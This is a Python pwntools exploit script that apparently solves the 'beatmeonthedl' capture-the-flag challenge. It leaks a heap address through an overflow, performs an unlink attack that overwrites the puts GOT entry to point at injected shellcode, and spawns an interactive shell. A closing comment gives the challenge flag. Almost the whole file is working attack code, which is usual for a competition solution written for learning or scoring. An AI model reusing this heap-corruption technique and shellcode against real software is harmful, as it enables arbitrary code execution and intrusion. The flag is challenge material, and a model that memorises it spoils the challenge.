#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "amd64"

if "remote" in sys.argv:
    r = remote("beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me", 6969)
else:
    r = process("./beatmeonthedl")

def Add(data):
    r.sendlineafter("| ", "1")
    r.sendafter("> ", (data+"\n")[:128])

def List():
    r.sendlineafter("| ", "2")

def Del(idx):
    r.sendlineafter("| ", "3")
    r.sendlineafter(": ", str(idx))

def Update(idx, data):
    r.sendlineafter("| ", "4")
    r.sendlineafter(": ", str(idx))
    r.sendafter(": ", (data+"\n")[:128])

r.sendlineafter("Enter username: ", "mcfly")
r.sendlineafter("Enter Pass: ", "awesnap")

Add("A" * 56)
Add("B" * 56)
Add("C" * 56)
Add("D" * 56)

# leak
Del(1)
Del(3)

Update(0, "A" * 71)
List()
r.recvline()
heap = u64(r.recvline()[:-1].ljust(8, "\0")) - 0xe0
log.info("heap = " + hex(heap))

# unlink
sc = "\xeb\x16" + "\x90" * 22 + asm(shellcraft.sh())
Update(2, sc)

fd = 0x609958 - 0x18 # puts @ got
bk = heap + 0xb0     # shellcode
Update(0, "A" * 56 + p64(0x40) + p64(fd) + p64(bk) + "B" * 40 + p64(0x40))

Del(0)

sleep(1)

r.interactive()

# The flag is: 3asy p33zy h3ap hacking!!

